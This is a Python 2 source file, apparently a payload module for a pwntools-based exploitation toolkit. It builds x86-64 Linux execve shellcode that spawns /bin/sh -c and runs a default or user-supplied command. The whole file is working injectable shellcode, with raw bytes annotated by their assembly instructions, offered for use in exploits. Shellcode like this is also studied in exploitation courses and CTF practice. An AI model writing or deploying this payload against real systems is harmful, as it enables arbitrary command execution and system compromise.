#! /usr/bin/python
# coding:utf-8
from pwnlib.util.packing import *

class Payload(object):
    def __init__(self):
        self.info = \
'''abstract : 这段shellcode的作用是运行一个文件，默认是打开终端。
architecture : x64
length : undefined
NULL byte: undefined.'''

    @property
    def data(self):
        cmd = '/bin/sh'+"\x00"
        call = "\xe8" + struct.pack('<L',len(cmd))
        c = raw_input("Enter the command to execute('/bin/sh' for default):")
        if c :
            cmd = c.strip().encode('ascii')+"\x00"
            call = "\xe8" + struct.pack('<L',len(cmd))
            print "Command: ",cmd
        self.payload = ''
        self.payload += "\x6a\x3b"                      # pushq  $0x3b
        self.payload += "\x58"                          # pop    %rax
        self.payload += "\x99"                          # cltd
        self.payload += "\x48\xbb\x2f\x62\x69\x6e\x2f"  # movabs $0x68732f6e69622f,%rbx
        self.payload += "\x73\x68\x00"                  #
        self.payload += "\x53"                          # push   %rbx
        self.payload += "\x48\x89\xe7"                  # mov    %rsp,%rdi
        self.payload += "\x68\x2d\x63\x00\x00"          # pushq  $0x632d
        self.payload += "\x48\x89\xe6"                  # mov    %rsp,%rsi
        self.payload += "\x52"                          # push   %rdx
        self.payload += call                            # callq  2d <run>
        self.payload += cmd                             # .ascii "cmd\0"
        self.payload += "\x56"                          # push   %rsi
        self.payload += "\x57"                          # push   %rdi
        self.payload += "\x48\x89\xe6"                  # mov    %rsp,%rsi
        self.payload += "\x0f\x05"                      # syscall
        return self.payload

if __name__=='__main__':
    p=Payload()
    if hasattr(p,'info') and hasattr(p,'data'):
        print "Correct Payload."
    else:
        print "Error: Payload missing 'info' or 'data'."
    print p.info
